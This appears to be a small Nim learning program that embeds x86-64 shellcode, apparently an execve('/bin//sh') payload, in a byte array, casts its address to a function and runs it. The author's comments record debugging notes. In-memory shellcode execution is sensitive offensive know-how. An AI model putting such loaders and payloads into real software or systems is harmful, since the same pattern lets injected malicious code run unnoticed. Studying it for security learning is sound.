; Author: Robert C. Raducioiu (rbct)
; Copyright: Attribution-NonCommercial-ShareAlike 4.0 International

import strutils

proc main(): void =

    # create byte array based on shellcode
    # also pay attention to its size
    # shellcode for x86-64 platform
    var shellcode: array[27, byte] = [
        byte(0x31),0xc0,0x48,0xbb,0xd1,0x9d,0x96,0x91,0xd0,0x8c,0x97,0xff,0x48,0xf7,0xdb,0x53,0x54,0x5f,0x99,0x52,0x57,0x54,0x5e,0xb0,0x3b,0x0f,0x05
    ]

    # let fPtr = cast[ByteAddress](shellcode)
    let shellcode_pointer = cast[ByteAddress](shellcode.unsafeAddr)

    # I don't understand why the the address isn't correct
    # there's an offset of 0x50 bytes between the real address and the one of unsafeAddr
    echo "[+] Address of shellcode: ", toHex(shellcode_pointer)
    
    # create function based on shellcode
    var run_shellcode : (proc() {.cdecl, gcsafe.}) = cast[(proc() {.cdecl, gcsafe.})](shellcode_pointer)

    # in my case the function echo is based on fwrite, so you set a breakpoint on:
    #   gef> b *fwrite
    echo "[+] Running shellcode"
    run_shellcode()

when isMainModule:
    main()
